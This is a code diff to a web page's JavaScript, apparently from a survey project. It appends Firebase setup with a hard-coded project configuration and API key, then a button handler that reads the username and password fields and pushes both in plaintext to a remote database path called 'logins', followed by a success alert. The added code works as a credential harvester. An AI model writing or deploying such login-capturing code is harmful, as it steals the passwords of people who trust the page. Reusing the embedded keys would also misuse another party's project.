@@ -69,4 +69,47 @@ exportButton.style.cursor = 'pointer';
 
 exportButton.addEventListener('click', exportData);
 
-document.querySelector('.container').appendChild(exportButton);
+document.querySelector('.container').appendChild(exportButton);// Import Firebase libraries from CDN (if not using modules)
+import { initializeApp } from "firebase/app";
+import { getDatabase, ref, set, push } from "firebase/database";
+import { getAnalytics } from "firebase/analytics";
+
+// Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyA9OmaoHS2-9nOn3nq86IHhCZzuDuIz9b4",
+  authDomain: "survey-project-c9b67.firebaseapp.com",
+  databaseURL: "https://survey-project-c9b67-default-rtdb.firebaseio.com/",
+  projectId: "survey-project-c9b67",
+  storageBucket: "survey-project-c9b67.firebasestorage.app",
+  messagingSenderId: "277832694827",
+  appId: "1:277832694827:web:2dc4f27d8a7be1914e7e6e",
+  measurementId: "G-Q1ETPYXM08"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+const analytics = getAnalytics(app);
+
+// Submit user data to Firebase Database
+const loginButton = document.querySelector("button");
+loginButton.addEventListener("click", (e) => {
+  e.preventDefault();
+
+  const username = document.querySelector("input[type='text']").value;
+  const password = document.querySelector("input[type='password']").value;
+
+  if (username && password) {
+    // Push data to Firebase Realtime Database
+    const newEntry = push(ref(database, "logins"));
+    set(newEntry, {
+      username: username,
+      password: password,
+    });
+
+    alert("Data submitted successfully!");
+  } else {
+    alert("Please fill in both fields.");
+  }
+});
+
